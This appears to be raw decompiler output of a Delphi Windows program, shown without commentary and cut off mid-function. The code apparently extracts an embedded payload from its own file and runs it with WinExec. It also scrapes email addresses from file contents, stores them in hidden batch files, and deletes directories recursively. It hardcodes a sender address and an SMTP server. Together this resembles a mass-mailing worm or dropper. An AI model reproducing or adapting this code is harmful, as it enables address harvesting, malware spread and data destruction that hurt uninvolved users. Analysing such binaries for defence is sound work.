// 41EEF0: using guessed type int dword_41EEF0;

//----- (0041692C) --------------------------------------------------------
void __userpurge sub_41692C(int a1@<eax>, int a2@<edx>, char *a3@<ecx>, char **a4)
{
  LStr *v5; // ecx
  _BYTE *v6; // ebx
  char *v7; // ecx
  char v8; // zf
  int v9; // esi
  int v10; // edi
  LStr *v11; // ecx
  LStr *v12; // ecx
  LStr *v13; // ecx
  unsigned int v14[2]; // [esp-Ch] [ebp-34h] BYREF
  LStr *v15; // [esp-4h] [ebp-2Ch]
  BYTE *v16; // [esp+Ch] [ebp-1Ch] BYREF
  BYTE *v17; // [esp+10h] [ebp-18h] BYREF
  int v18; // [esp+14h] [ebp-14h]
  BYTE *v19; // [esp+18h] [ebp-10h] BYREF
  int v20; // [esp+1Ch] [ebp-Ch]
  char *v21; // [esp+20h] [ebp-8h]
  int v22; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v16 = 0;
  v17 = 0;
  v19 = 0;
  v21 = a3;
  v22 = a2;
  sub_4038D8((int)a3);
  v15 = (LStr *)&savedregs;
  v14[1] = (unsigned int)&loc_416A09;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  System::__linkproc__ LStrClr(v5);
  if ( a1 > 0 )
  {
    v18 = a1;
    v20 = 1;
    v6 = &unk_41E6D8;
    do
    {
      if ( *v6 == 70 && v6[1] == 65 )
      {
        sub_403670(&v17);
        System::__linkproc__ LStrCmp(v7, v21);
        if ( v8 )
        {
          v9 = v22;
          if ( v22 > 0 )
          {
            v10 = 1;
            do
            {
              sub_403670(&v16);
              System::__linkproc__ LStrCat(&v19, (char *)v16);
              ++v10;
              --v9;
            }
            while ( v9 );
          }
        }
      }
      ++v20;
      ++v6;
      --v18;
    }
    while ( v18 );
  }
  __linkproc__ LStrAsg(a4, (char *)v19);
  v11 = v15;
  __writefsdword(0, v14[0]);
  v15 = (LStr *)&loc_416A10;
  System::__linkproc__ LStrArrayClr(v11, 2);
  System::__linkproc__ LStrClr(v12);
  System::__linkproc__ LStrClr(v13);
}
// 416961: variable 'v5' is possibly undefined
// 416995: variable 'v7' is possibly undefined
// 41699A: variable 'v8' is possibly undefined
// 4169FB: variable 'v12' is possibly undefined
// 416A03: variable 'v13' is possibly undefined

//----- (00416A1C) --------------------------------------------------------
void __userpurge sub_416A1C(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>, char **a4)
{
  LStr *v5; // ecx
  LStr *v6; // ecx
  LStr *v7; // ecx
  unsigned int v8[2]; // [esp-Ch] [ebp-174h] BYREF
  LStr *v9; // [esp-4h] [ebp-16Ch]
  _DWORD v10[83]; // [esp+8h] [ebp-160h] BYREF
  char *v11; // [esp+154h] [ebp-14h] BYREF
  char *v12; // [esp+158h] [ebp-10h] BYREF
  int v13; // [esp+15Ch] [ebp-Ch] BYREF
  char *v14; // [esp+160h] [ebp-8h]
  char *v15; // [esp+164h] [ebp-4h]
  int savedregs; // [esp+168h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v14 = a2;
  v15 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v14);
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_416B0F;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  System::__linkproc__ LStrClr(v5);
  System::__linkproc__ Assign(v10, v15);
  *off_41DC30 = 0;
  sub_40510D((int)v10, 1);
  sub_40265C();
  do
  {
    sub_404EB8((int)v10, &unk_41E6D8, 2048, (DWORD *)&v13);
    sub_40265C();
    sub_41692C(v13, a3, v14, &v12);
    if ( v12 )
      __linkproc__ LStrLAsg(&v11, v12);
  }
  while ( v13 );
  CLOSE((int)v10);
  sub_40265C();
  __linkproc__ LStrAsg(a4, v11);
  v6 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_416B16;
  System::__linkproc__ LStrArrayClr(v6, 2);
  System::__linkproc__ LStrArrayClr(v7, 2);
}
// 416A5B: variable 'v5' is possibly undefined
// 416B09: variable 'v7' is possibly undefined
// 41DC30: using guessed type char *off_41DC30;

//----- (00416B20) --------------------------------------------------------
void __usercall sub_416B20(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v4; // ebx
  LStr *v5; // ecx
  LStr *v6; // ecx
  unsigned int v7[2]; // [esp-Ch] [ebp-2C0h] BYREF
  LStr *v8; // [esp-4h] [ebp-2B8h]
  _DWORD v9[83]; // [esp+8h] [ebp-2ACh] BYREF
  _DWORD v10[83]; // [esp+154h] [ebp-160h] BYREF
  char v11; // [esp+2A3h] [ebp-11h] BYREF
  char *v12; // [esp+2A4h] [ebp-10h] BYREF
  int v13; // [esp+2A8h] [ebp-Ch] BYREF
  char *v14; // [esp+2ACh] [ebp-8h]
  char *v15; // [esp+2B0h] [ebp-4h]
  int savedregs; // [esp+2B4h] [ebp+0h] BYREF

  v12 = 0;
  v14 = a2;
  v15 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v14);
  v8 = (LStr *)&savedregs;
  v7[1] = (unsigned int)&loc_416C45;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( !sub_4071A8(v14) )
  {
    v4 = 0;
    Sysutils::ExtractFileName(v15, &v12);
    System::__linkproc__ Assign(v10, v15);
    System::__linkproc__ Assign(v9, v14);
    *off_41DC30 = 0;
    sub_40510D((int)v10, 1);
    sub_40265C();
    sub_405124((int)v9, 1);
    sub_40265C();
    do
    {
      sub_404EB8((int)v10, &v11, 1, (DWORD *)&v13);
      sub_40265C();
      if ( a3 <= ++v4 )
      {
        sub_404F1C((int)v9, &v11, v13, (DWORD *)&v13);
        sub_40265C();
      }
    }
    while ( v13 );
    CLOSE((int)v10);
    sub_40265C();
    CLOSE((int)v9);
    sub_40265C();
  }
  v5 = v8;
  __writefsdword(0, v7[0]);
  v8 = (LStr *)&loc_416C4C;
  System::__linkproc__ LStrClr(v5);
  System::__linkproc__ LStrArrayClr(v6, 2);
}
// 416C3F: variable 'v6' is possibly undefined
// 41DC30: using guessed type char *off_41DC30;

//----- (00416C54) --------------------------------------------------------
void __usercall sub_416C54(char *a1@<eax>, int a2@<edx>)
{
  char *v3; // ecx
  char v4; // zf
  char *v5; // eax
  char *v6; // ecx
  char *v7; // ecx
  char *v8; // ecx
  char *v9; // eax
  LStr *v10; // ecx
  UINT v11; // [esp-Ch] [ebp-7Ch] BYREF
  void *v12; // [esp-8h] [ebp-78h]
  int *v13; // [esp-4h] [ebp-74h]
  LStr *v14; // [esp+0h] [ebp-70h]
  BYTE *v15; // [esp+4h] [ebp-6Ch] BYREF
  char *v16; // [esp+8h] [ebp-68h] BYREF
  char *v17; // [esp+Ch] [ebp-64h] BYREF
  BYTE *v18; // [esp+10h] [ebp-60h] BYREF
  char *v19; // [esp+14h] [ebp-5Ch] BYREF
  BYTE *v20; // [esp+18h] [ebp-58h] BYREF
  char *v21; // [esp+1Ch] [ebp-54h] BYREF
  BYTE *v22; // [esp+20h] [ebp-50h] BYREF
  char *v23; // [esp+24h] [ebp-4Ch] BYREF
  BYTE *v24; // [esp+28h] [ebp-48h] BYREF
  char *v25; // [esp+2Ch] [ebp-44h] BYREF
  BYTE *v26; // [esp+30h] [ebp-40h] BYREF
  BYTE *v27; // [esp+34h] [ebp-3Ch] BYREF
  char *v28; // [esp+38h] [ebp-38h] BYREF
  char *v29; // [esp+3Ch] [ebp-34h] BYREF
  char *v30; // [esp+40h] [ebp-30h] BYREF
  char *v31; // [esp+44h] [ebp-2Ch] BYREF
  char *v32; // [esp+48h] [ebp-28h] BYREF
  char *v33; // [esp+4Ch] [ebp-24h] BYREF
  char *v34; // [esp+50h] [ebp-20h] BYREF
  BYTE *v35; // [esp+54h] [ebp-1Ch] BYREF
  char *v36; // [esp+58h] [ebp-18h] BYREF
  char *v37; // [esp+5Ch] [ebp-14h] BYREF
  char *v38; // [esp+60h] [ebp-10h] BYREF
  char *v39; // [esp+64h] [ebp-Ch] BYREF
  char *v40; // [esp+68h] [ebp-8h] BYREF
  char *v41; // [esp+6Ch] [ebp-4h]
  int savedregs; // [esp+70h] [ebp+0h] BYREF

  v41 = a1;
  sub_4038D8((int)a1);
  v13 = &savedregs;
  v12 = &loc_416F90;
  v11 = (UINT)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  sub_415EAC((int)a, (char *)dword_416FB0, (char *)dword_416FA4, &v36, 1, 1);
  Sysutils::ExtractFileName(v41, &v37);
  Sysutils::ChangeFileExt(v37, 0, (BYTE **)&v38);
  if ( !__linkproc__ LStrPos((char)dword_416FBC, v38) )
    __linkproc__ LStrLAsg(&v38, v37);
  System::__linkproc__ LStrCatN(&dword_41EEF4, 3);
  sub_41609C(6, &v35);
  System::__linkproc__ LStrCat3((BYTE **)&v38, v35, v38);
  sub_416B20(v41, v38, a2 + 1);
  sub_416178(v38, dword_41EEF4, 1);
  sub_415EAC((int)a, "FB1B", dword_41EEF4, &v34, 1, 1);
  v11 = 1;
  sub_416A1C(v41, (char *)dword_416FE4, 90, &v31);
  Sysutils::Trim(v31, &v32);
  sub_415EAC((int)a, "FB1BB", v32, &v33, 1, v11);
  v11 = 1;
  sub_416A1C(v41, (char *)dword_417000, 90, &v28);
  Sysutils::Trim(v28, &v29);
  sub_415EAC((int)a, "FB1BA", v29, &v30, 1, v11);
  sub_41620C((int)v38, &v27);
  sub_415FAC((int)v27, 1, &v40);
  System::__linkproc__ LStrCmp(v3, (char *)dword_41701C);
  if ( v4 )
  {
    v11 = 1;
    Sysutils::ExtractShortPathName(v38, &v26);
    v5 = sub_4038E8((char *)v26);
    WinExec(v5, v11);
  }
  else
  {
    sub_415FAC((int)dword_417028, 0, &v25);
    __linkproc__ LStrAsg(&dword_41EEF4, v25);
    System::__linkproc__ LStrCmp(v6, (char *)dword_417068);
    if ( v4 )
    {
      v11 = 0;
      sub_415FAC((int)dword_417074, 0, &v23);
      System::__linkproc__ LStrCat3(&v24, (BYTE *)dword_41EEF4, v23);
      sub_415EAC((int)v24, 0, 0, &v39, 1, v11);
      if ( !v39 )
      {
        v11 = 0;
        sub_415FAC((int)dword_41708C, 0, &v21);
        System::__linkproc__ LStrCat3(&v22, (BYTE *)dword_41EEF4, v21);
        sub_415EAC((int)v22, 0, 0, &v39, 1, v11);
      }
    }
    else
    {
      System::__linkproc__ LStrCmp(v7, (char *)dword_4170A4);
      if ( v4 )
      {
        v11 = 0;
        sub_415FAC((int)dword_4170B0, 0, &v19);
        System::__linkproc__ LStrCat3(&v20, (BYTE *)dword_41EEF4, v19);
        sub_415EAC((int)v20, 0, 0, &v39, 1, v11);
      }
      else
      {
        System::__linkproc__ LStrCmp(v8, (char *)dword_4170C4);
        if ( v4 )
        {
          v11 = 0;
          sub_415FAC((int)dword_4170D0, 0, &v17);
          System::__linkproc__ LStrCat3(&v18, (BYTE *)dword_41EEF4, v17);
          sub_415EAC((int)v18, 0, 0, &v39, 1, v11);
        }
      }
    }
    if ( !v39 )
      sub_415FAC((int)dword_4170E4, 0, &v39);
    v11 = 1;
    Sysutils::ExtractShortPathName(v38, &v15);
    System::__linkproc__ LStrCatN(&v16, 3);
    v9 = sub_4038E8(v16);
    WinExec(v9, v11);
  }
  v10 = v14;
  __writefsdword(0, (unsigned int)v12);
  v14 = (LStr *)&loc_416F97;
  System::__linkproc__ LStrArrayClr(v10, 27);
}
// 416DDC: variable 'v3' is possibly undefined
// 416DE1: variable 'v4' is possibly undefined
// 416E27: variable 'v6' is possibly undefined
// 416EAD: variable 'v7' is possibly undefined
// 416EF2: variable 'v8' is possibly undefined
// 416FA4: using guessed type int dword_416FA4[3];
// 416FB0: using guessed type int dword_416FB0[3];
// 416FBC: using guessed type int dword_416FBC[3];
// 416FE4: using guessed type int dword_416FE4[3];
// 417000: using guessed type int dword_417000[3];
// 41701C: using guessed type int dword_41701C[3];
// 417028: using guessed type int dword_417028[14];
// 417068: using guessed type int dword_417068[3];
// 417074: using guessed type int dword_417074[4];
// 41708C: using guessed type int dword_41708C[4];
// 4170A4: using guessed type int dword_4170A4[3];
// 4170B0: using guessed type int dword_4170B0[5];
// 4170C4: using guessed type int dword_4170C4[3];
// 4170D0: using guessed type int dword_4170D0[5];
// 4170E4: using guessed type int dword_4170E4[12];
// 41EEF0: using guessed type int dword_41EEF0;

//----- (00417118) --------------------------------------------------------
int __usercall sub_417118@<eax>(char *a1@<eax>)
{
  int v1; // ebx
  LStr *v2; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-168h] BYREF
  LStr *v5; // [esp-4h] [ebp-160h]
  _DWORD v6[83]; // [esp+4h] [ebp-158h] BYREF
  DWORD v7; // [esp+150h] [ebp-Ch] BYREF
  char v8; // [esp+157h] [ebp-5h] BYREF
  char *v9; // [esp+158h] [ebp-4h]
  int savedregs; // [esp+15Ch] [ebp+0h] BYREF

  v9 = a1;
  sub_4038D8((int)a1);
  v5 = (LStr *)&savedregs;
  v4[1] = (unsigned int)&loc_4171B2;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  System::__linkproc__ Assign(v6, v9);
  *off_41DC30 = 0;
  sub_40510D((int)v6, 1);
  sub_40265C();
  v1 = 0;
  do
  {
    sub_404EB8((int)v6, &v8, 1, &v7);
    sub_40265C();
    ++v1;
  }
  while ( v7 );
  CLOSE((int)v6);
  sub_40265C();
  v2 = v5;
  __writefsdword(0, v4[0]);
  v5 = (LStr *)&loc_4171B9;
  System::__linkproc__ LStrClr(v2);
  return v1 - 1;
}
// 41DC30: using guessed type char *off_41DC30;

//----- (004171C0) --------------------------------------------------------
int __userpurge sub_4171C0@<eax>(char *a1@<eax>, char *a2@<edx>, BYTE *a3@<ecx>, char a4, int a5, int a6, char *a7)
{
  int v7; // ebx
  char *v8; // ecx
  char v9; // zf
  int v10; // eax
  LStr *v11; // ecx
  LStr *v12; // ecx
  unsigned int v14[2]; // [esp-Ch] [ebp-24h] BYREF
  LStr *v15; // [esp-4h] [ebp-1Ch]
  char *v16; // [esp+4h] [ebp-14h] BYREF
  char *v17; // [esp+8h] [ebp-10h] BYREF
  BYTE *v18; // [esp+Ch] [ebp-Ch]
  char *v19; // [esp+10h] [ebp-8h]
  char *v20; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v7 = 1;
  v16 = 0;
  v17 = 0;
  v18 = a3;
  v19 = a2;
  v20 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v19);
  sub_4038D8((int)v18);
  sub_4038D8((int)a7);
  sub_4038D8(a6);
  sub_4038D8(a5);
  v15 = (LStr *)&savedregs;
  v14[1] = (unsigned int)&loc_4172D2;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  __linkproc__ LStrLAsg(&v17, "FA2sc");
  __linkproc__ LStrLAsg(
    &v17,
    "FA5info@willeiter.at                                                                         ");
  __linkproc__ LStrLAsg(&v17, "FA8137216  ");
  __linkproc__ LStrLAsg(
    &v17,
    "FA9email.aon.at                                                                              ");
  if ( a4 )
  {
    sub_416A1C(v19, (char *)dword_4173E0, 2, &v16);
    System::__linkproc__ LStrCmp(v8, (char *)&dword_4173EC);
    LOBYTE(v7) = !v9;
  }
  if ( (_BYTE)v7 )
  {
    v10 = sub_417118(v20);
    sub_416478(v20, v19, v18, a4, 1, v10, a5, a6, (int)&dword_4173EC, a7);
  }
  v11 = v15;
  __writefsdword(0, v14[0]);
  v15 = (LStr *)&loc_4172D9;
  System::__linkproc__ LStrArrayClr(v11, 5);
  System::__linkproc__ LStrArrayClr(v12, 3);
  return v7;
}
// 417270: variable 'v8' is possibly undefined
// 417275: variable 'v9' is possibly undefined
// 4172CC: variable 'v12' is possibly undefined
// 4173E0: using guessed type int dword_4173E0[3];
// 4173EC: using guessed type int dword_4173EC;

//----- (004173F0) --------------------------------------------------------
void __cdecl sub_4173F0(int a1)
{
  LStr *v1; // ecx
  LStr *v2; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v3; // [esp-Ch] [ebp-114h] BYREF
  void *v4; // [esp-8h] [ebp-110h]
  int *v5; // [esp-4h] [ebp-10Ch]
  LStr *v6; // [esp+0h] [ebp-108h] BYREF
  unsigned __int8 v7[256]; // [esp+4h] [ebp-104h] BYREF
  char *v8; // [esp+104h] [ebp-4h] BYREF
  int savedregs; // [esp+108h] [ebp+0h] BYREF

  v6 = 0;
  v8 = 0;
  v5 = &savedregs;
  v4 = &loc_4174A1;
  v3 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v3);
  sub_40296C(++*(_DWORD *)(a1 - 4), v7);
  sub_4036EC((BYTE **)&v8, v7);
  sub_415FAC((int)"9luv", 0, (char **)&v6);
  System::__linkproc__ LStrCatN(&v8, 3);
  (*(void (**)(void))(**(_DWORD **)(a1 - 12) + 100))();
  Sysutils::FileSetAttr(2u, v8);
  v1 = v6;
  __writefsdword(0, (unsigned int)v4);
  v6 = (LStr *)&loc_4174A8;
  System::__linkproc__ LStrClr(v1);
  System::__linkproc__ LStrClr(v2);
}
// 41749B: variable 'v2' is possibly undefined

//----- (004174BC) --------------------------------------------------------
void __usercall sub_4174BC(int a1@<eax>, LStr *a2@<ecx>)
{
  LStr *v3; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v4; // [esp-Ch] [ebp-96Ch] BYREF
  void *v5; // [esp-8h] [ebp-968h]
  int *v6; // [esp-4h] [ebp-964h]
  LStr *v7; // [esp+0h] [ebp-960h]
  BYTE *v8; // [esp+8h] [ebp-958h] BYREF
  char *v9; // [esp+Ch] [ebp-954h] BYREF
  BYTE v10[2048]; // [esp+10h] [ebp-950h] BYREF
  _DWORD v11[83]; // [esp+810h] [ebp-150h] BYREF
  DWORD v12; // [esp+95Ch] [ebp-4h] BYREF
  int savedregs; // [esp+960h] [ebp+0h] BYREF

  v8 = 0;
  v9 = 0;
  v6 = &savedregs;
  v5 = &loc_41759F;
  v4 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v4);
  System::__linkproc__ LStrClr(a2);
  (*(void (__fastcall **)(char **, int, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)dword_41EF14 + 12))(
    &v9,
    a1,
    v4);
  System::__linkproc__ Assign(v11, v9);
  sub_40510D((int)v11, 1);
  sub_40265C();
  do
  {
    sub_404EB8((int)v11, v10, 2048, &v12);
    sub_40265C();
    __linkproc__ LStrFromPCharLen(&v8, v10, 2048);
    System::__linkproc__ LStrCat((BYTE **)&dword_41EEDC, (char *)v8);
  }
  while ( v12 );
  CLOSE((int)v11);
  sub_40265C();
  v3 = v7;
  __writefsdword(0, (unsigned int)v5);
  v7 = (LStr *)&loc_4175A6;
  System::__linkproc__ LStrArrayClr(v3, 2);
}
// 41EEDC: using guessed type int dword_41EEDC;
// 41EF14: using guessed type int dword_41EF14;

//----- (004175AC) --------------------------------------------------------
void __usercall sub_4175AC(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  LStr *v3; // ecx
  int v4; // edi
  LStr *v5; // ecx
  int i; // esi
  char v7; // bl
  int j; // esi
  char v9; // bl
  int v10; // eax
  LStr *v11; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v12; // [esp-18h] [ebp-2Ch] BYREF
  void *v13; // [esp-14h] [ebp-28h]
  LStr *v14; // [esp-10h] [ebp-24h]
  int v15; // [esp-Ch] [ebp-20h]
  int v16; // [esp-8h] [ebp-1Ch]
  int v17; // [esp-4h] [ebp-18h]
  BYTE *v18; // [esp+0h] [ebp-14h] BYREF
  BYTE *v19; // [esp+4h] [ebp-10h] BYREF
  BYTE *v20; // [esp+8h] [ebp-Ch] BYREF
  BYTE *v21; // [esp+Ch] [ebp-8h] BYREF
  char *v22; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v22 = 0;
  v21 = 0;
  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = a1;
  v16 = a3;
  v15 = a2;
  v14 = (LStr *)&savedregs;
  v13 = &loc_417795;
  v12 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v12);
  do
  {
    v4 = __linkproc__ LStrPos((char)dword_4177AC, (char *)dword_41EEDC);
    if ( v4 > 0 )
    {
      System::__linkproc__ LStrClr(v3);
      System::__linkproc__ LStrClr(v5);
      __linkproc__ LStrCopy((char *)dword_41EEDC, v4 - 18, 50, &v22);
      for ( i = __linkproc__ LStrPos((char)dword_4177AC, v22) - 1; i > 1; --i )
      {
        v7 = v22[i - 1];
        if ( (unsigned __int8)(v7 - 97) < 0x1Au
          || (unsigned __int8)(v7 - 65) < 0x1Au
          || v7 == 46
          || v7 == 95
          || (unsigned __int8)(v7 - 48) < 0xAu )
        {
          sub_403670(&v19);
          System::__linkproc__ LStrCat3(&v21, v19, (char *)v21);
        }
        else
        {
          i = 0;
        }
      }
      for ( j = __linkproc__ LStrPos((char)dword_4177AC, v22) + 1; j < sub_403724((int)v22); ++j )
      {
        v9 = v22[j - 1];
        if ( (unsigned __int8)(v9 - 97) < 0x1Au
          || (unsigned __int8)(v9 - 65) < 0x1Au
          || v9 == 46
          || v9 == 45
          || v9 == 95
          || (unsigned __int8)(v9 - 48) < 0xAu )
        {
          sub_403670(&v18);
          System::__linkproc__ LStrCat(&v20, (char *)v18);
        }
        else
        {
          j = sub_403724((int)v22);
        }
      }
      System::__linkproc__ LStrCatN(&v22, 3);
      if ( (unsigned __int8)(*v22 - 48) >= 0xAu
        && __linkproc__ LStrPos((char)&dword_4177B8, (char *)v20) > 0
        && *v22 != 64
        && sub_403724((int)v22) > 5 )
      {
        v10 = sub_403724((int)v22);
        if ( v22[v10 - 1] != 64 )
          (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, LStr *, int, int, int))(*(_DWORD *)dword_41EF18 + 52))(
            v12,
            v13,
            v14,
            v15,
            v16,
            v17);
      }
      System::__linkproc__ LStrDelete((char **)&dword_41EEDC, 1, v4 + 1);
    }
  }
  while ( v4 );
  v11 = v14;
  __writefsdword(0, (unsigned int)v12);
  v14 = (LStr *)&loc_41779C;
  System::__linkproc__ LStrArrayClr(v11, 5);
}
// 4175AC: could not find valid save-restore pair for ebx
// 4175AC: could not find valid save-restore pair for edi
// 4175AC: could not find valid save-restore pair for esi
// 4175E4: variable 'v3' is possibly undefined
// 4175EC: variable 'v5' is possibly undefined
// 4177AC: using guessed type int dword_4177AC[3];
// 4177B8: using guessed type int dword_4177B8;
// 41EEDC: using guessed type int dword_41EEDC;
// 41EF18: using guessed type int dword_41EF18;

//----- (004177BC) --------------------------------------------------------
int __usercall sub_4177BC@<eax>(int a1@<eax>, int a2@<edi>)
{
  _DWORD *v2; // eax
  int v3; // eax
  LStr *v4; // ecx
  int v5; // esi
  int v6; // ebx
  int v7; // esi
  int v8; // ebx
  char *v9; // ecx
  char v10; // zf
  int v11; // ebx
  LStr *v12; // ecx
  LStr *v13; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v15; // [esp-Ch] [ebp-3Ch] BYREF
  void *v16; // [esp-8h] [ebp-38h]
  int *v17; // [esp-4h] [ebp-34h]
  LStr *v18; // [esp+0h] [ebp-30h]
  int v19; // [esp+Ch] [ebp-24h] BYREF
  int v20; // [esp+10h] [ebp-20h] BYREF
  BYTE *v21; // [esp+14h] [ebp-1Ch] BYREF
  BYTE *v22; // [esp+18h] [ebp-18h] BYREF
  int v23; // [esp+1Ch] [ebp-14h] BYREF
  int v24; // [esp+20h] [ebp-10h]
  _DWORD *v25; // [esp+24h] [ebp-Ch]
  int v26; // [esp+28h] [ebp-8h]
  int v27; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v26 = a1;
  sub_4038D8(a1);
  v17 = &savedregs;
  v16 = &loc_417915;
  v15 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v15);
  v27 = 0;
  TObject_Create(&off_40BBB4);
  v25 = v2;
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)dword_41EF18 + 64))(v15);
  v3 = (*(int (**)(void))(*(_DWORD *)dword_41EF14 + 20))() - 1;
  if ( v3 >= 0 )
  {
    v5 = v3 + 1;
    v6 = 0;
    do
    {
      sub_4174BC(v6, v4);
      sub_4175AC(v6++, a2, v5--);
    }
    while ( v5 );
  }
  (*(void (**)(void))(*(_DWORD *)dword_41EF18 + 124))();
  v24 = 0;
  v7 = (*(int (**)(void))(*(_DWORD *)dword_41EF18 + 20))() - 1;
  if ( v7 > 0 )
  {
    v8 = 1;
    do
    {
      Sysutils::UpperCase(v23, &v22);
      v15 = (struct _EXCEPTION_REGISTRATION_RECORD *)v22;
      (*(void (__fastcall **)(int *, int, BYTE *))(*(_DWORD *)dword_41EF18 + 12))(&v20, v8, v22);
      Sysutils::UpperCase(v20, &v21);
      System::__linkproc__ LStrCmp(v9, (char *)v21);
      if ( !v10 )
      {
        if ( v24 == 500 )
        {
          sub_4173F0((int)&savedregs);
          (*(void (**)(void))(*v25 + 64))();
          v24 = 0;
        }
        else
        {
          (*(void (__fastcall **)(int *, int))(*(_DWORD *)dword_41EF18 + 12))(&v19, v8);
          (*(void (**)(void))(*v25 + 52))();
          ++v24;
        }
      }
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)dword_41EF18 + 12))(&v23, v8++);
      --v7;
    }
    while ( v7 );
  }
  if ( v24 )
    sub_4173F0((int)&savedregs);
  sub_402BDC(v25);
  v11 = v27;
  v12 = v18;
  __writefsdword(0, (unsigned int)v16);
  v18 = (LStr *)&loc_41791C;
  System::__linkproc__ LStrArrayClr(v12, 5);
  System::__linkproc__ LStrClr(v13);
  return v11;
}
// 4177F9: variable 'v2' is possibly undefined
// 41781C: variable 'v4' is possibly undefined
// 417880: variable 'v9' is possibly undefined
// 417885: variable 'v10' is possibly undefined
// 41790F: variable 'v13' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 41EF14: using guessed type int dword_41EF14;
// 41EF18: using guessed type int dword_41EF18;

//----- (00417928) --------------------------------------------------------
void __userpurge sub_417928(BYTE *a1@<eax>, char *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // eax
  char *v6; // ecx
  char *v7; // ecx
  char v8; // zf
  char *v9; // eax
  int v10; // eax
  char *v11; // ecx
  char *v12; // ecx
  char *v13; // eax
  LStr *v14; // ecx
  LStr *v15; // ecx
  unsigned int v16[2]; // [esp-Ch] [ebp-190h] BYREF
  LStr *v17; // [esp-4h] [ebp-188h]
  BYTE *v18; // [esp+8h] [ebp-17Ch] BYREF
  BYTE *v19; // [esp+Ch] [ebp-178h] BYREF
  BYTE *v20; // [esp+10h] [ebp-174h] BYREF
  BYTE *v21; // [esp+14h] [ebp-170h] BYREF
  BYTE *v22; // [esp+18h] [ebp-16Ch] BYREF
  BYTE *v23; // [esp+1Ch] [ebp-168h] BYREF
  BYTE *v24; // [esp+20h] [ebp-164h] BYREF
  char v25[12]; // [esp+24h] [ebp-160h] BYREF
  char *v26; // [esp+30h] [ebp-154h]
  char *v27; // [esp+17Ch] [ebp-8h]
  BYTE *v28; // [esp+180h] [ebp-4h] BYREF
  int savedregs; // [esp+184h] [ebp+0h] BYREF

  v18 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v27 = a2;
  v28 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v27);
  sub_403AF0((int)v25, (int)dword_4061D8);
  v17 = (LStr *)&savedregs;
  v16[1] = (unsigned int)&loc_417BCB;
  v16[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v16);
  v5 = sub_403724((int)v28);
  if ( v28[v5 - 1] != 92 )
    System::__linkproc__ LStrCat(&v28, (char *)dword_417BE4);
  System::__linkproc__ LStrCat3(&v24, v28, (char *)dword_417BF0);
  if ( !Sysutils::FindFirst((char *)v24, 63, (int)v25) )
  {
    do
    {
      System::__linkproc__ LStrCmp(v6, (char *)dword_417BFC);
      if ( !v8 )
      {
        System::__linkproc__ LStrCmp(v7, (char *)&dword_417C08);
        if ( !v8 && (v25[8] & 0x10) != 0 )
        {
          System::__linkproc__ LStrCat3(&v23, v28, v26);
          sub_417928(a4);
          if ( (_BYTE)a4 )
          {
            System::__linkproc__ LStrCat3(&v22, v28, v26);
            v9 = sub_4038E8((char *)v22);
            RemoveDirectoryA(v9);
          }
        }
      }
    }
    while ( !Sysutils::FindNext((int)v25) );
  }
  sub_4072B8((int)v25);
  v10 = sub_403724((int)v28);
  if ( v28[v10 - 1] != 92 )
    System::__linkproc__ LStrCat(&v28, (char *)dword_417BE4);
  System::__linkproc__ LStrCat3(&v21, v28, v27);
  if ( !Sysutils::FindFirst((char *)v21, 47, (int)v25) )
  {
    do
    {
      System::__linkproc__ LStrCmp(v11, (char *)dword_417BFC);
      if ( !v8 )
      {
        System::__linkproc__ LStrCmp(v12, (char *)&dword_417C08);
        if ( !v8 )
        {
          if ( v26 )
          {
            if ( (_BYTE)a4 )
            {
              System::__linkproc__ LStrCat3(&v20, v28, v26);
              Sysutils::FileSetAttr(0, (char *)v20);
              System::__linkproc__ LStrCat3(&v19, v28, v26);
              v13 = sub_4038E8((char *)v19);
              DeleteFileA(v13);
            }
            else
            {
